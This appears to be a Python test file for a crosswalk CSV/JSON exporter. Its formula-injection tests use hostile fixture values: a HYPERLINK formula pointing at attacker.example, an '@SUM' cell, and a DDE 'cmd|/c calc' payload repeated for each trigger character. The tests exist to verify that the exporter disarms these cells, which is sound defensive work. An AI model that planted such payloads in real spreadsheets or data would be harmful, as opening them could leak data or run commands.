"""Tests for crosswalk export."""
from __future__ import annotations

import csv
import json

import pytest


@pytest.fixture
def populated_db(tmp_path):
    from tract.crosswalk.schema import create_database
    from tract.crosswalk.store import (
        insert_assignments,
        insert_controls,
        insert_frameworks,
        insert_hubs,
        update_review_status,
    )

    db_path = tmp_path / "test.db"
    create_database(db_path)
    insert_frameworks(db_path, [{"id": "fw1", "name": "FW1", "version": "1.0", "fetch_date": "2026-04-30", "control_count": 2}])
    insert_hubs(db_path, [
        {"id": "h1", "name": "Hub 1", "path": "R > H1", "parent_id": None},
        {"id": "h2", "name": "Hub 2", "path": "R > H2", "parent_id": None},
    ])
    insert_controls(db_path, [
        {"id": "fw1:c1", "framework_id": "fw1", "section_id": "c1", "title": "C1", "description": "Desc1", "full_text": None},
        {"id": "fw1:c2", "framework_id": "fw1", "section_id": "c2", "title": "C2", "description": "Desc2", "full_text": None},
    ])
    insert_assignments(db_path, [
        {"control_id": "fw1:c1", "hub_id": "h1", "confidence": 0.9, "in_conformal_set": 1, "is_ood": 0, "provenance": "training_T1", "source_link_id": "link1", "model_version": "v1", "review_status": "pending"},
        {"control_id": "fw1:c2", "hub_id": "h2", "confidence": 0.7, "in_conformal_set": 0, "is_ood": 0, "provenance": "al_r1", "source_link_id": None, "model_version": "v1", "review_status": "pending"},
    ])
    update_review_status(db_path, 1, "accepted", reviewer="expert")
    return db_path


class TestExportJSON:
    def test_exports_accepted_only(self, populated_db, tmp_path) -> None:
        from tract.crosswalk.export import export_crosswalk

        out = export_crosswalk(populated_db, tmp_path / "out.json", fmt="json")
        data = json.loads(out.read_text(encoding="utf-8"))

        assert "FW1" in data
        assert len(data["FW1"]) == 1
        assert "fw1:c1" in data["FW1"]


class TestExportCSV:
    def test_exports_all_with_status(self, populated_db, tmp_path) -> None:
        from tract.crosswalk.export import export_crosswalk

        out = export_crosswalk(populated_db, tmp_path / "out.csv", fmt="csv")
        with open(out, encoding="utf-8") as f:
            reader = csv.DictReader(f)
            rows = list(reader)

        assert len(rows) == 2
        assert rows[0]["review_status"] in ("accepted", "pending")


class TestCSVFormulaInjection:
    """A cell that left the database as text must not arrive as a formula."""

    @pytest.fixture
    def hostile_db(self, tmp_path):
        from tract.crosswalk.schema import create_database
        from tract.crosswalk.store import (
            insert_assignments,
            insert_controls,
            insert_frameworks,
            insert_hubs,
        )

        db_path = tmp_path / "hostile.db"
        create_database(db_path)
        insert_frameworks(db_path, [{
            "id": "fw1",
            "name": '=HYPERLINK("http://attacker.example/?x","Click")',
            "version": "1.0",
            "fetch_date": "2026-04-30",
            "control_count": 2,
        }])
        insert_hubs(db_path, [
            {"id": "h1", "name": "Hub 1", "path": "R > H1", "parent_id": None},
        ])
        insert_controls(db_path, [
            {"id": "A-1", "framework_id": "fw1", "section_id": "A-1",
             "title": "C1", "description": "Desc1", "full_text": None},
            {"id": "-1", "framework_id": "fw1", "section_id": "-1",
             "title": "C2", "description": "Desc2", "full_text": None},
        ])
        insert_assignments(db_path, [
            {"control_id": "A-1", "hub_id": "h1", "confidence": -0.5,
             "in_conformal_set": 0, "is_ood": 0, "provenance": "@SUM(1+1)",
             "source_link_id": None, "model_version": "v1",
             "review_status": "pending"},
            {"control_id": "-1", "hub_id": "h1", "confidence": 0.7,
             "in_conformal_set": 0, "is_ood": 0, "provenance": "model_prediction",
             "source_link_id": None, "model_version": "v1",
             "review_status": "pending"},
        ])
        return db_path

    def _rows_by_control(self, path):
        with open(path, encoding="utf-8", newline="") as f:
            return {r["control_id"]: r for r in csv.DictReader(f)}

    def test_trigger_cells_are_disarmed(self, hostile_db, tmp_path) -> None:
        from tract.crosswalk.export import CSV_FORMULA_GUARD, export_crosswalk

        out = export_crosswalk(hostile_db, tmp_path / "out.csv", fmt="csv")
        rows = self._rows_by_control(out)

        # The framework name is stored text and lands in every row.
        for row in rows.values():
            assert row["framework"].startswith(CSV_FORMULA_GUARD + "="), row
        assert rows["A-1"]["provenance"] == CSV_FORMULA_GUARD + "@SUM(1+1)"

    def test_legitimate_values_stay_readable(self, hostile_db, tmp_path) -> None:
        """The guard must not be spent on values that were never formulas."""
        from tract.crosswalk.export import export_crosswalk

        out = export_crosswalk(hostile_db, tmp_path / "out.csv", fmt="csv")
        rows = self._rows_by_control(out)

        # A hyphenated identifier never had a leading trigger at all.
        assert "A-1" in rows
        # A leading '-' that parses as a number is passed through, in the
        # identifier column and in the numeric one alike.
        assert "-1" in rows
        assert rows["A-1"]["confidence"] == "-0.5"

    def test_every_trigger_is_covered_and_non_strings_survive(self) -> None:
        """Guards the trigger set itself, and the float that used to crash it."""
        from tract.crosswalk.export import neutralize_csv_cell

        for trigger in ("=", "+", "-", "@", "\t", "\r"):
            payload = f"{trigger}cmd|'/c calc'!A0"
            assert neutralize_csv_cell(payload) != payload, trigger
        # Every row carries a float confidence and a nullable reviewer; a guard
        # that indexed value[0] would take down every CSV export.
        assert neutralize_csv_cell(-0.5) == -0.5
        assert neutralize_csv_cell(None) is None
        assert neutralize_csv_cell("") == ""
